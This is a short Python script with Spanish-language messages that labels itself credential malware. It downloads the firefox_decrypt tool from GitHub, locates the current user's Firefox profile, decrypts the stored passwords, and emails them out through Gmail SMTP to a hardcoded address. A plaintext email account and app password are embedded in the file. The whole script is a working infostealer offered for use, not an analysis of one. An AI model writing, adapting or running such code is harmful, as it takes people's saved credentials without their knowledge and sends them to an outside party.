#!/usr/bin/env python3
# coding: cp850

import os
import smtplib
import requests
import tempfile
import subprocess

from email.mime.text import MIMEText

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        try:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())
        except smtplib.SMTPAuthenticationError:
            print("\n[!] Credenciales incorrectas.\n")
            os._exit(1)

def run_command(command):
    try:
        print(f"\n[+] Ejecutando el comando: {command}\n")
        output_command = subprocess.run(command, capture_output=True, text=True)
        return output_command.stdout.strip() if output_command else None
    except subprocess.CalledProcessError as e:
        print(f"\n[!] Error al ejecutar el comando: {e}\n")
        return None

def download_file(url, name):
    re = requests.get(url)
    dirname = tempfile.mkdtemp()
    os.chdir(dirname)

    with open(name, 'wb') as f:
        f.write(re.content)

    return dirname

def get_profiles():
    username_str = run_command(['whoami'])
    username = username_str.split('\\')[1]
    
    path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    profiles = [profile for profile in os.listdir(path) if "release" in profile]

    return path + profiles[0]

def main():
    url, name = ['https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py', 'firefox_decrypt.py']
    dirname = download_file(url, name)

    profile = get_profiles()
    command = ["python", f"{name}", f"{profile}"]
    output = run_command(command)

    if output:
        send_email("Malware de credenciales", output, "leonardo13guillen@gmail.com", ["leonardo13guillen@gmail.com"], "gxjy ljar ifor ttqs ")
    

if __name__ == "__main__":
    main()